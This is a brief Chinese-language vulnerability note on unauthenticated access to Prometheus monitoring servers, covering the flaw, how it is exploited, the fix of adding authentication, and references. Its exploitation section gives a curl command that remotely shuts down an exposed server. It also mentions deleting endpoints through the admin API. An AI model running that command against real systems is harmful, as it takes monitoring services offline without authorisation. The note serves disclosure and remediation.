### 一 漏洞描述
Prometheus 是一个开源监控系统，它前身是SoundCloud的告警工具包。从 2012 年开始，许多公司和组织开始使用 Prometheus。  
常与Grafana(便捷的可视化解决方案)组合。  

Prometheus未授权访问漏洞，攻击者可利用该漏洞获取敏感信息，/api/v1/status/flags的web.enable-admin-api和web-enable-lifecycle如果为True则可以关闭服务或者删除所有的端点。

### 二 漏洞利用
查询
![img.png](img.png)

关闭
```
curl -X POST :9090/-/quit
```
https://www.robustperception.io/shutting-down-prometheus/

### 三 漏洞修复
添加身份验证

> 参考链接  
> https://www.cnvd.org.cn/flaw/show/CNVD-2021-101528  
> https://jfrog.com/blog/dont-let-prometheus-steal-your-fire/  
> PromQL: https://yunlzheng.gitbook.io/prometheus-book/parti-prometheus-ji-chu/promql/prometheus-query-language
> PromQL: https://prometheus.io/docs/prometheus/latest/querying/basics/  
> https://www.robustperception.io/shutting-down-prometheus/
